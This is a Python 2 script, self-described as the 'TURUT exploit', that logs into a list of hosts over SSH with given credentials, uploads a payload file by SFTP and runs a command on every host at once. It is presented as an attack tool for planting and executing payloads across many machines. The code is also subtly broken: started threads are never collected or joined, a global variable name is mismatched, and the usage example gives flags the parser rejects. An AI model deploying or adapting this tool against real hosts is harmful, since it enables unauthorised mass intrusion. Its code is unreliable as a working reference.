#!usr/bin/python

import time, os, sys, subprocess, paramiko, select, threading, string, traceback, getopt

# Initiate argvars
iplist = ''
username = ''
passwd = ''
localpath = ''
remotepath = ''
command = ''
ftp = False

# Thread Lock
outlock = threading.Lock()

# Main
def main(argv):

    # Argument Variables
    global iplist
    global user
    global passwd
    global localpath
    global remotepath
    global command
    global ftp
    
    # If no arguments, print Help Mode
    if not len(sys.argv[4:]):
        usage()
        sys.exit()

    # Handle Argument input
    try:
        options, args = getopt.getopt(argv, "hi:u:p:l:r:c:", ["help","ip-list","username","password","local-path","remote-path","command"])
    except getopt.GetoptError as err:
        print (str(err))
        usage()
        sys.exit()
    
    # Assign Values from args
    for opt, arg in options:
        if opt in ("-h", "--help"):
            usage()
            sys.exit()
        elif opt in ("-i", "--ip-list"):
            iplist = arg
        elif opt in ("-u", "--username"):
            user = arg
        elif opt in ("-p", "--password"):
            passwd = arg
        elif opt in ("-l", "--local-path"):
            localpath = arg
            ftp = True
        elif opt in ("-r", "--remote-path"):
            remotepath = arg
            ftp = True
        elif opt in ("-c", "--command"):
            command = arg
    
    # Create basket for threads
    threads = []

    # Open IP list for parsing
    f = open(iplist)
    lines = f.readlines()
    empty_list = True
    
    # Parse list
    for ip in lines: 
        print "Starting thread for {} to execute ssh commands".format(ip)
        empty_list = False

        # Strip that pesky newline character that you spent 30 minutes trying to find the error for
        ip = ip.rstrip()
        
        # Assign threads a function
        t = threading.Thread(target=ssh_exec, args=(ip,))
        t.start()

    # Close list file
    f.close()

    if empty_list:
        print ("List is empty, No IPs to contact. Exiting...")
        sys.exit()

    # Combine all threads; Resolve
    print "Joining Threads"
    for t in threads:
        t.join()
    print "Threads joined"
    
    # Exit gracefully
    exit(0)


def ssh_exec(host):
    
    # Open Paramiko client
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())

        # Login with creds provided to $host
        client.connect(host, username=user, password=passwd, look_for_keys=False, allow_agent=False)
        
        # Transfer file if able
        if ftp:
            try:
                sftp = client.open_sftp()
                sftp.put(localpath,remotepath)
                print "Copied {} payload to host {}".format(localpath,host)     
            except Exception:
                print('SFTP connection failed for {}'.format(host))
                print("{} : {}".format(host, traceback.format_exc()))
        
        # Execute payload/command
        print "executing payload command for {}".format(host)
        stdin, stdout, stderr = client.exec_command(command)
        stdin.flush()
        print "payload executed for {}".format(host)
        
        # Print maybe?
        with outlock:
            print stdout.readlines()

    # Catch those bad bois
    except Exception:
        print('Connection Failed for {}').format(host)
        print("{} : {}".format(host, traceback.format_exc()))
    
    # Close the door
    finally:
        if client is not None:
            print "Finished, closing connection for {}".format(host)
            client.close()




### HELP-MODE ###

def usage():
    print ('''
        This is the HELP mode of the TURUT exploit
        
        >> USAGE: python turut.py -i <hosts-file> -u <username> -p <password> -l <localfile-path> -r <remotefile-path> -c <command> &
        
        >> INPUT:
             -h      : Display this screen
             -i      : List-of-IPs filename
             -u      : Username you wish to log in as
             -p      : Password for the respective Username
             -l      : [Optional] LocalFile path to be SFTP'd
             -r      : [Optional] RemoteFile path to be planted
             -c      : Command to be executed
              
              &                 : MUST BE RUN AS BACKGROUND JOB
                                SCRIPT WILL HANG FOREVER AND KILL CURRENT SHELL IF NOT
                                HOWEVER, THE PROCESS CAN BE KILLED AFTER IT HAS FULLY EXECUTED
                                [ie. T > 1 Minute]
        
        >> EXAMPLE:
            python turut.py -n hosts.txt -u root -p password1! -f /home/zathras/file2b_sent -r /root/file2b_sent -c "echo This-script-is-working | wall" &
    ''')

# Main Execution
if __name__ == "__main__":
    main(sys.argv[1:])
